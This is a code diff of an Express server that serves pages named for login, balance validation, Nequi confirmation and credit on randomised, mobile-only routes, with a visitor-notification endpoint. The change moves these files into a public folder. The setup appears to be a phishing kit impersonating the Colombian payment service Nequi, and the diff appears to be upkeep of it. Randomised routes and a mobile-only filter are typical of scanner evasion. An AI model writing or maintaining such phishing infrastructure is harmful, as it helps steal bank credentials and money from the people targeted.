@@ -33,7 +33,7 @@ app.use(cors());
 app.use(bodyParser.json());
 
 // Serve static assets with logging
-app.use(express.static(path.join(process.cwd()))); 
+app.use(express.static(path.join(process.cwd(), 'public'))); 
 
 // Middleware for Mobile Detection
 const mobileCheck = (req, res, next) => {
@@ -78,23 +78,23 @@ app.get('/api/notify-visitor', (req, res) => {
 
 // Serve specific HTML files on random routes (Mobile Only)
 app.get(ROUTES.INDEX, mobileCheck, (req, res) => {
-    res.sendFile(path.join(process.cwd(), 'index.html'));
+    res.sendFile(path.join(process.cwd(), 'public', 'index.html'));
 });
 
 app.get(ROUTES.LOGIN, mobileCheck, (req, res) => {
-    res.sendFile(path.join(process.cwd(), 'login_final.html'));
+    res.sendFile(path.join(process.cwd(), 'public', 'login_final.html'));
 });
 
 app.get(ROUTES.VALIDATION, mobileCheck, (req, res) => {
-    res.sendFile(path.join(process.cwd(), 'validacion_saldo.html'));
+    res.sendFile(path.join(process.cwd(), 'public', 'validacion_saldo.html'));
 });
 
 app.get(ROUTES.DYNAMIC, mobileCheck, (req, res) => {
-    res.sendFile(path.join(process.cwd(), 'confirmacion_nequi.html'));
+    res.sendFile(path.join(process.cwd(), 'public', 'confirmacion_nequi.html'));
 });
 
 app.get(ROUTES.CREDIT, mobileCheck, (req, res) => {
-    res.sendFile(path.join(process.cwd(), 'credito.html'));
+    res.sendFile(path.join(process.cwd(), 'public', 'credito.html'));
 });
 
 // Root redirect to random index
